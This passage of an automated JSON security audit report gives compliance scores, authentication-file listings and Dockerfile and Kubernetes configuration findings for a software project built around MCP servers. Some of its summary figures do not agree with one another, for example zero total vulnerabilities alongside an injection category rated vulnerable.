          "DEBUG",
          "WARNING",
          "ERROR",
          "ERROR",
          "WARNING",
          "DEBUG",
          "WARNING",
          "ERROR",
          "CRITICAL",
          "INFO",
          "WARNING",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "ERROR",
          "WARNING",
          "DEBUG",
          "WARNING",
          "WARNING",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "WARNING",
          "ERROR",
          "CRITICAL",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "WARNING",
          "WARNING",
          "WARNING",
          "WARNING",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "ERROR",
          "INFO",
          "INFO",
          "ERROR",
          "INFO",
          "ERROR",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "WARNING",
          "INFO",
          "INFO",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "INFO",
          "WARNING",
          "DEBUG",
          "INFO",
          "INFO",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "INFO",
          "INFO",
          "DEBUG",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "DEBUG",
          "WARNING",
          "ERROR",
          "ERROR",
          "WARNING",
          "DEBUG",
          "WARNING",
          "ERROR",
          "CRITICAL",
          "INFO",
          "WARNING",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "ERROR",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "INFO",
          "INFO",
          "DEBUG",
          "WARNING",
          "ERROR",
          "ERROR",
          "WARNING",
          "DEBUG",
          "WARNING",
          "ERROR",
          "CRITICAL",
          "INFO",
          "WARNING",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "WARNING",
          "WARNING",
          "WARNING",
          "WARNING",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "ERROR",
          "INFO",
          "INFO",
          "ERROR",
          "INFO",
          "ERROR",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO"
        ],
        "security_events_logged": true,
        "log_protection": false
      },
      "monitoring_systems": {
        "prometheus_metrics": true,
        "grafana_dashboards": true,
        "alerting_configured": true,
        "health_checks": true
      },
      "incident_response": {
        "playbooks_found": true,
        "automated_response": true,
        "escalation_procedures": true,
        "forensic_capabilities": true
      },
      "threat_detection": {
        "ids_ips_configured": true,
        "anomaly_detection": true,
        "threat_intelligence": true,
        "behavior_analysis": true
      },
      "audit_trails": {
        "comprehensive_logging": true,
        "tamper_protection": true,
        "log_retention": true,
        "compliance_logging": true
      }
    },
    "compliance_assessment": {
      "owasp_top_10_compliance": {
        "individual_assessments": {
          "A01_broken_access_control": {
            "status": "NEEDS_REVIEW",
            "score": 0
          },
          "A02_cryptographic_failures": {
            "status": "NEEDS_REVIEW",
            "score": 0
          },
          "A03_injection": {
            "status": "VULNERABLE",
            "score": 0
          },
          "A04_insecure_design": {
            "status": "NEEDS_REVIEW",
            "score": 0
          },
          "A05_security_misconfiguration": {
            "status": "NEEDS_REVIEW",
            "score": 0
          },
          "A06_vulnerable_components": {
            "status": "NEEDS_REVIEW",
            "score": 0
          },
          "A07_identification_auth_failures": {
            "status": "VULNERABLE",
            "score": 0
          },
          "A08_software_data_integrity": {
            "status": "NEEDS_REVIEW",
            "score": 0
          },
          "A09_security_logging_monitoring": {
            "status": "NEEDS_REVIEW",
            "score": 0
          },
          "A10_server_side_request_forgery": {
            "status": "NEEDS_REVIEW",
            "score": 0
          }
        },
        "overall_compliance_score": 0.0,
        "compliance_level": "NON_COMPLIANT"
      },
      "nist_framework_compliance": {
        "framework_functions": {
          "identify": {
            "score": 30,
            "status": "PARTIAL"
          },
          "protect": {
            "score": 20,
            "status": "MINIMAL"
          },
          "detect": {
            "score": 25,
            "status": "PARTIAL"
          },
          "respond": {
            "score": 10,
            "status": "MINIMAL"
          },
          "recover": {
            "score": 15,
            "status": "MINIMAL"
          }
        },
        "overall_score": 20.0,
        "maturity_level": "INITIAL"
      },
      "iso_27001_compliance": {
        "controls_assessment": {
          "information_security_policies": false,
          "organization_information_security": false,
          "human_resource_security": false,
          "asset_management": false,
          "access_control": false,
          "cryptography": false,
          "physical_environmental_security": false,
          "operations_security": false,
          "communications_security": false,
          "system_acquisition_development": false,
          "supplier_relationships": false,
          "information_security_incident_management": false,
          "information_security_business_continuity": false,
          "compliance": false
        },
        "implemented_controls": 0,
        "total_controls": 14,
        "compliance_percentage": 0.0,
        "certification_readiness": "NOT_READY"
      },
      "gdpr_compliance": {
        "gdpr_requirements": {
          "lawful_basis_processing": false,
          "consent_management": false,
          "data_subject_rights": false,
          "privacy_by_design": false,
          "data_protection_impact_assessment": false,
          "data_breach_notification": false,
          "data_protection_officer": false,
          "cross_border_transfers": false
        },
        "compliance_score": 0.0,
        "compliance_status": "NON_COMPLIANT"
      },
      "pci_dss_compliance": {
        "pci_requirements": {
          "firewall_configuration": false,
          "default_passwords": false,
          "cardholder_data_protection": false,
          "encrypted_transmission": false,
          "antivirus_software": false,
          "secure_systems_applications": false,
          "access_control_measures": false,
          "unique_ids": false,
          "physical_access_restriction": false,
          "network_monitoring": false,
          "security_testing": false,
          "information_security_policy": false
        },
        "compliance_score": 0.0,
        "saq_level": "D"
      }
    }
  },
  "vulnerability_summary": {
    "total_vulnerabilities": 0,
    "critical": 0,
    "high": 0,
    "medium": 0,
    "by_category": {
      "authentication": 0,
      "authorization": 0,
      "input_validation": 0,
      "injection": 0,
      "encryption": 0,
      "configuration": 0,
      "monitoring": 0,
      "compliance": 0
    }
  },
  "compliance_assessment": {
    "owasp_top_10": {
      "individual_assessments": {
        "A01_broken_access_control": {
          "status": "NEEDS_REVIEW",
          "score": 0
        },
        "A02_cryptographic_failures": {
          "status": "NEEDS_REVIEW",
          "score": 0
        },
        "A03_injection": {
          "status": "VULNERABLE",
          "score": 0
        },
        "A04_insecure_design": {
          "status": "NEEDS_REVIEW",
          "score": 0
        },
        "A05_security_misconfiguration": {
          "status": "NEEDS_REVIEW",
          "score": 0
        },
        "A06_vulnerable_components": {
          "status": "NEEDS_REVIEW",
          "score": 0
        },
        "A07_identification_auth_failures": {
          "status": "VULNERABLE",
          "score": 0
        },
        "A08_software_data_integrity": {
          "status": "NEEDS_REVIEW",
          "score": 0
        },
        "A09_security_logging_monitoring": {
          "status": "NEEDS_REVIEW",
          "score": 0
        },
        "A10_server_side_request_forgery": {
          "status": "NEEDS_REVIEW",
          "score": 0
        }
      },
      "overall_compliance_score": 0.0,
      "compliance_level": "NON_COMPLIANT"
    },
    "nist_framework": {
      "framework_functions": {
        "identify": {
          "score": 30,
          "status": "PARTIAL"
        },
        "protect": {
          "score": 20,
          "status": "MINIMAL"
        },
        "detect": {
          "score": 25,
          "status": "PARTIAL"
        },
        "respond": {
          "score": 10,
          "status": "MINIMAL"
        },
        "recover": {
          "score": 15,
          "status": "MINIMAL"
        }
      },
      "overall_score": 20.0,
      "maturity_level": "INITIAL"
    },
    "overall_compliance_score": 6.666666666666667
  },
  "security_architecture_assessment": {
    "authentication_security": {
      "strength": "MODERATE",
      "mechanisms": {
        "mechanisms_found": {
          "jwt_tokens": true,
          "oauth2": true,
          "basic_auth": true,
          "api_keys": true,
          "custom_auth": false
        },
        "authentication_files": [
          "test_all_mcp_servers_parallel.py",
          "test_env/lib/python3.12/site-packages/requests/models.py",
          "test_gemini_direct.py",
          "security_audit_phase3_infrastructure.py",
          "deploy_mcp_security_hardened.py",
          "tests/utils/test_data.py",
          "examples/claude_code_circle_of_experts.py",
          "test_env/lib/python3.12/site-packages/websockets/__init__.py",
          "src/auth/api.py",
          "security_audit_circle_consultation.py",
          "mcp_servers/test_api_integration_stability.py",
          "examples/circle_of_experts_rust_accelerated.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/testing/profiling.py",
          "test_security_updates.py",
          "test_env/lib/python3.12/site-packages/fastapi/openapi/models.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/rules.py",
          "src/database/models.py",
          "mcp_learning_system/add_missing_commands.py",
          "src/circle_of_experts/core/connection_pool_integration.py",
          "src/auth/audit.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/models.py",
          "tests/circle_of_experts/test_backwards_compat.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
          "bash_god_devops_expansion.py",
          "test_env/lib/python3.12/site-packages/aiohttp/__init__.py",
          "test_production_modules_comprehensive.py",
          "update_all_documentation_parallel.py",
          "test_env/lib/python3.12/site-packages/jwt/warnings.py",
          "test_circle_of_experts_comprehensive.py",
          "simple_api_demo.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/gbq.py",
          "demo_api_integrations.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
          "test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
          "agent_6_api_integration_tests.py",
          "backup_agent3_20250607_010225/src/mcp/servers.py",
          "discover_and_integrate_mcp_servers.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/distlib/compat.py",
          "test_env/lib/python3.12/site-packages/requests/sessions.py",
          "test_env/lib/python3.12/site-packages/jwt/api_jwt.py",
          "src/database/init.py",
          "src/circle_of_experts/drive/manager.py",
          "comprehensive_test_suite.py",
          "discover_and_integrate_mcp_servers_v2.py",
          "test_env/lib/python3.12/site-packages/requests/adapters.py",
          "test_env/lib/python3.12/site-packages/websockets/sync/server.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/common.py",
          "test_memory_leak_fixes.py",
          "test_env/lib/python3.12/site-packages/aiohttp/helpers.py",
          "agent4_comprehensive_security_audit.py",
          "src/auth/__init__.py",
          "mcp_servers/templates/python-server.py",
          "test_rbac_simple.py",
          "test_env/lib/python3.12/site-packages/urllib3/util/request.py",
          "src/circle_of_experts/experts/commercial_experts.py",
          "security_audit_phase2.py",
          "validate_phase1_security.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
          "test_mcp_servers.py",
          "mcp_learning_system/security_monitoring_expansion.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
          "api_performance_benchmark.py",
          "mcp_learning_system/test_agent8_simple.py",
          "scripts/setup_pipeline.py",
          "supply_chain_security_audit.py",
          "test_deepseek_simple.py",
          "test_deepseek_direct.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/six.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
          "test_env/lib/python3.12/site-packages/fastapi/security/oauth2.py",
          "src/auth/user_manager.py",
          "code-base-crawler/code-base-crawler/run_security_validation.py",
          "src/core/logging_config.py",
          "test_env/lib/python3.12/site-packages/jwt/api_jws.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/common.py",
          "backup_agent3_20250607_010225/docs/api/clients/python-client.py",
          "backup_agent3_20250607_010225/src/mcp/security/scanner_server.py",
          "test_mcp_comprehensive.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/frame.py",
          "deploy_mcp_production_final.py",
          "test_logging_system.py",
          "devops_expansion_integration.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/models.py",
          "src/mcp/monitoring/prometheus_server.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
          "rust_core/security_audit_env/mcp_learning_system/deployment/scripts/production_certification.py",
          "deploy_mcp_production_fixed.py",
          "test_gemini_integration.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/request.py",
          "mcp_learning_system/test_production_integration_agent8.py",
          "setup_mcp_servers_complete.py",
          "scripts/setup_circle_of_experts.py",
          "test_circle_of_experts_local_validation.py",
          "test_phase1_security_mitigations.py",
          "test_rbac_core.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/request.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/session.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
          "test_env/lib/python3.12/site-packages/twisted/web/test/test_httpauth.py",
          "fix_remaining_issues.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/request.py",
          "src/api/brave_client.py",
          "install_mcpso_servers_final.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/requests/models.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pyparsing/common.py",
          "test_advanced_security_mitigations.py",
          "test_env/lib/python3.12/site-packages/jwt/__init__.py",
          "test_env/lib/python3.12/site-packages/fastapi/security/__init__.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/request.py",
          "src/api/smithery_client.py",
          "security_audit_test.py",
          "test_env/lib/python3.12/site-packages/httpx/__init__.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
          "src/circle_of_experts/experts/claude_expert.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
          "backup_agent3_20250607_010225/src/mcp/monitoring/prometheus_server.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
          "test_all_mcp_servers.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/models.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/request.py",
          "tests/conftest.py",
          "test_security_mcp_servers_comprehensive.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
          "test_mcp_security_integration.py",
          "src/circle_of_experts/experts/expert_factory.py",
          "test_rbac_system.py",
          "src/mcp/servers.py",
          "scripts/verify_mcp_imports.py",
          "code-base-crawler/code-base-crawler/security_remediation.py",
          "test_env/lib/python3.12/site-packages/jwt/exceptions.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/distlib/compat.py",
          "docs/api/clients/python-client.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/common.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/request.py",
          "mcp_servers/api_integration_stability_test.py",
          "src/auth/middleware.py",
          "test_env/lib/python3.12/site-packages/websockets/legacy/auth.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/six.py",
          "test_deepseek_integration.py",
          "test_environments/circle_experts/experts/security_expert.py",
          "monitoring/mcp_logging.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/distlib/compat.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/distlib/compat.py",
          "test_security_mitigations.py",
          "test_env/lib/python3.12/site-packages/requests/auth.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
          "src/utils/security.py",
          "test_openrouter_direct.py",
          "comprehensive_module_test_suite.py",
          "code-base-crawler/code-base-crawler/deploy_security_framework.py",
          "examples/video_to_documentation_example.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/session.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/rules.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/request.py",
          "src/circle_of_experts/experts/openrouter_expert.py",
          "simple_deepseek_test.py",
          "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/client.py",
          "test_env/lib/python3.12/site-packages/websockets/asyncio/server.py",
          "test_env/lib/python3.12/site-packages/httpx/_client.py",
          "tests/fixtures/test_data_manager.py",
          "test_circle_of_experts_simple.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/six.py",
          "test_env/lib/python3.12/site-packages/fastapi/openapi/docs.py",
          "test_env/lib/python3.12/site-packages/six.py",
          "agent_6_comprehensive_integration_testing_framework.py",
          "deploy_parallel_10_agents.py",
          "test_env/lib/python3.12/site-packages/twisted/words/test/test_jabberclient.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
          "test_env/lib/python3.12/site-packages/jwt/api_jwk.py",
          "validate_final_security.py",
          "src/api/tavily_client.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
          "code-base-crawler/code-base-crawler/security_scan.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/session.py",
          "security_audit.py",
          "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
          "test_env/lib/python3.12/site-packages/fastapi/security/api_key.py",
          "src/api/__init__.py",
          "src/database/repositories/user_repository.py",
          "comprehensive_documentation_validator.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/models.py",
          "test_environments/chaos_engineering/failure_injector.py",
          "src/security/mcp_security_core.py",
          "src/database/migrations/alembic/versions/20250531_0001_initial_schema.py",
          "mcp_learning_system/deployment/scripts/production_certification.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/request.py",
          "test_env/lib/python3.12/site-packages/jwt/jwk_set_cache.py",
          "test_env/lib/python3.12/site-packages/pip/_internal/network/session.py",
          "test_env/lib/python3.12/site-packages/jwt/jwks_client.py",
          "test_rbac_direct.py",
          "src/security/mcp_secure_server.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/distlib/compat.py",
          "src/security/vulnerability_management.py",
          "agent_6_real_mcp_server_tests.py",
          "code-base-crawler/code-base-crawler/cbc_security/error_sanitizer.py",
          "test_env/lib/python3.12/site-packages/fastapi/dependencies/utils.py",
          "monitoring/mcp_tracing.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/six.py",
          "src/mcp/security/auth_middleware.py",
          "test_env/lib/python3.12/site-packages/aiohttp/client.py",
          "verify_circle_of_experts.py",
          "test_env/lib/python3.12/site-packages/fastapi/applications.py",
          "test_env/lib/python3.12/site-packages/urllib3/_request_methods.py",
          "src/api/manager.py",
          "src/api/base.py",
          "src/auth/models.py",
          "backup_agent3_20250607_010225/src/mcp/security/auth_middleware.py",
          "test_env/lib/python3.12/site-packages/fastapi/param_functions.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/_php_builtins.py",
          "full_stack_review.py",
          "src/circle_of_experts/experts/open_source_experts.py",
          "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
          "src/mcp/security/scanner_server.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/request.py",
          "validate_security_updates.py",
          "tests/security/comprehensive_security_tests.py",
          "validation_config_test.py",
          "code-base-crawler/code-base-crawler/run_security_audit.py",
          "backup_agent3_20250607_010225/src/core/logging_config.py",
          "src/auth/tokens.py",
          "mcp_learning_system/bash_god_security_commands.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/common.py",
          "test_env/lib/python3.12/site-packages/httpx/_auth.py",
          "test_database_integration.py",
          "enhanced_supply_chain_audit.py",
          "src/auth/rbac.py",
          "test_mcp_servers_simplified.py",
          "monitoring/mcp_health_checks.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
          "test_api_integrations.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/session.py",
          "src/api/config.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
          "mcp_learning_system/final_production_validation.py",
          "agent_6_load_testing_integration_suite.py",
          "scripts/run_memory_tests.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/request.py",
          "mcp_servers/mcp_api_integration_server.py",
          "test_rbac_standalone.py",
          "test_env/lib/python3.12/site-packages/jwt/help.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/six.py",
          "test_env/lib/python3.12/site-packages/prometheus_client/exposition.py",
          "test_authentication_bypass_fixes.py",
          "src/auth/permissions.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
          "test_mcp_security_comprehensive.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/common.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/six.py",
          "test_env/lib/python3.12/site-packages/aiohttp/client_reqrep.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
          "test_final_security_validation.py"
        ],
        "security_score": 80
      },
      "mfa_implemented": true,
      "score": 80
    },
    "infrastructure_security": {
      "container_security": {
        "dockerfiles_analyzed": 20,
        "total_issues": 5,
        "critical_issues": 0,
        "dockerfile_analysis": [
          {
            "file": "Dockerfile.rust-production",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "Dockerfile.secure",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "Dockerfile.python-production",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "Dockerfile",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "Dockerfile.rust-build",
            "issues": [
              {
                "line": 0,
                "issue": "No USER directive found",
                "severity": "HIGH",
                "recommendation": "Add USER directive to run as non-root"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 1
          },
          {
            "file": "mcp_learning_system/Dockerfile",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "mcp_learning_system/Dockerfile.learning-python",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "mcp_servers/Dockerfile.mcp-typescript",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "mcp_servers/Dockerfile.typescript-production",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "code-base-crawler/code-base-crawler/Dockerfile.simple",
            "issues": [
              {
                "line": 1,
                "issue": "Using latest tag",
                "severity": "MEDIUM",
                "recommendation": "Use specific version tags"
              },
              {
                "line": 0,
                "issue": "No USER directive found",
                "severity": "HIGH",
                "recommendation": "Add USER directive to run as non-root"
              }
            ],
            "total_issues": 2,
            "critical_issues": 0,
            "high_issues": 1
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/Dockerfile.test",
            "issues": [
              {
                "line": 0,
                "issue": "No USER directive found",
                "severity": "HIGH",
                "recommendation": "Add USER directive to run as non-root"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 1
          },
          {
            "file": "code-base-crawler/code-base-crawler/deploy/docker/Dockerfile",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "code-base-crawler/code-base-crawler/test_results/integration_20250608_100235/Dockerfile",
            "issues": [
              {
                "line": 0,
                "issue": "No USER directive found",
                "severity": "HIGH",
                "recommendation": "Add USER directive to run as non-root"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 1
          },
          {
            "file": "mcp_learning_system/servers/Dockerfile.rust-server",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "containers/development/Dockerfile.rust-dev",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "containers/development/Dockerfile.mcp-server",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "containers/development/Dockerfile.python-ml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "containers/production/Dockerfile.mcp-server-prod",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "containers/production/Dockerfile.rust-service",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "containers/production/Dockerfile.python-api",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          }
        ]
      },
      "kubernetes_security": {
        "k8s_files_analyzed": 58,
        "total_issues": 58,
        "critical_issues": 2,
        "k8s_analysis": [
          {
            "file": "k8s/security-context.yaml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/deployments.yaml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/mcp-services.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/mcp-hpa.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/security-policy.yaml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/services.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/mcp-rbac.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/secrets.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/namespace.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/mcp-namespace.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
